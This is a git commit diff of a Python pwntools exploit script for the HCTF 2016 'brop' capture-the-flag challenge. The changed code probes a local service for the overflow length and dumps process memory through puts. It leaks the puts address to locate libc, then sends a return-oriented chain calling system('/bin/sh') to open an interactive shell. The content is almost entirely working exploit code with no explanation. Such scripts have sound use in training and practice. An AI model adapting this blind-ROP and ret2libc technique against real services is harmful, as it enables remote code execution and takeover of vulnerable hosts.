c535c03e1c02db05d6a1da446a241b1c104ea206
leetsun <leetsun@protonmail.com>
2019-06-12 19:48:00 -0700

    brop try successfully

--- pwn/rop/brop/hctf2016-brop/myexp.py
+++ pwn/rop/brop/hctf2016-brop/myexp.py
@@ -4,7 +4,7 @@ from LibcSearcher import *
 context.log_level = 'debug'
 
 def get_overflow_len():
-    cnt = 1
+    cnt = 70
     while 1 :
         try:
             sh = remote('127.0.0.1',9999)
@@ -19,7 +19,7 @@ def get_overflow_len():
                 cnt += 1
         except EOFError:
             sh.close()
-            log.info("get overflow length:" + hex(cnt - 1))
+            log.info("crush,get overflow length:" + hex(cnt - 1))
             return cnt - 1
 
 
@@ -97,19 +97,20 @@ def get_puts_plt(length,rdi_ret,stop_gadget):
             sh.close()
             puts_plt += 1
 
-def dump(length,rdi_ret,puts_plt,stop_gadget):
+def dump(length,rdi_ret,puts_plt,stop_gadget,base,dump_len):
     cnt = 0
     data = ""
-    while cnt < 1024:
+    while cnt < dump_len:
         sh = remote('127.0.0.1',9999)
         sh.recvuntil('WelCome my friend,Do you know password?\n')
-        payload = 'a' * length + p64(rdi_ret) + p64(0x400000+cnt) + p64(puts_plt) + p64(stop_gadget) 
+        payload = 'a' * length + p64(rdi_ret) + p64(base+cnt) + p64(puts_plt) + p64(stop_gadget) 
         sh.sendline(payload)
         output = sh.recv()
+        output = output[:-1]
         print output
         sh.close()
         try:
-            output = output[:output.index("\n")]
+            output = output[:output.index("\nWel")]
             if output == "":
                 output = '\x00'
             cnt += len(output)
@@ -121,20 +122,7 @@ def dump(length,rdi_ret,puts_plt,stop_gadget):
             data += output
 
     with open('code','wb') as f:
-        f.write(data)
-
-def leak(length,rdi_ret,puts_plt,stop_gadget):
-    puts_got = 0x601018
-    sh = remote('127.0.0.1',9999)
-    sh.recvuntil('WelCome my friend,Do you know password?\n')
-    payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget) 
-    sh.sendline(payload)
-    output = sh.readline()
-    sh.close()
-    output = output.strip('\n').ljust(8,'\x00')
-    puts_addr = u64(output)
-    print hex(puts_addr)
-    return puts_addr   
+        f.write(data) 
         
 
 if __name__ == '__main__':
@@ -147,15 +135,32 @@ if __name__ == '__main__':
     rdi_ret = brop_gadget + 0x9
     #puts_plt = get_puts_plt(length,rdi_ret,stop_gadget)
     puts_plt = 0x400560
-    #dump(length,rdi_ret,puts_plt,stop_gadget)
-    puts_addr = leak(length,rdi_ret,puts_plt,stop_gadget)
+    #dump(length,rdi_ret,puts_plt,stop_gadget,0x400000,0x1000)
+    #dump(length,rdi_ret,puts_plt,stop_gadget,0x600608,1024)
+    #raw_input()
+    ## leak libc address
+    puts_got = 0x601018
+    sh = remote('127.0.0.1',9999)
+    sh.recvuntil('WelCome my friend,Do you know password?\n')
+    payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget) 
+    sh.sendline(payload)
+    output = sh.recv()
+    output = output[:output.index('\nWel')].ljust(8,'\x00')
+    puts_addr = u64(output)
+    log.success("puts function's address:" + hex(puts_addr))
     libc = LibcSearcher('puts',puts_addr)
+    #add_condition()
     libc_base = puts_addr - libc.dump('puts')
+    log.success("libc base address:" + hex(libc_base))
+    ## get shell
     system = libc_base + libc.dump('system')
     binsh = libc_base + libc.dump('str_bin_sh')
-    payload = p64(rdi_ret) + p64(binsh) + p64(system) + p64(stop_gadget)
-    sh = remote('127.0.0.1',9999)
+    log.info("system and binsh address:" + hex(system) + "--" + hex(binsh))
+    payload = 'a' * length + p64(rdi_ret) + p64(binsh) + p64(system) + p64(stop_gadget)
     sh.sendline(payload)
+    output = sh.recv()
+    #raw_input()
+    print "normal"
     sh.interactive()
     
 
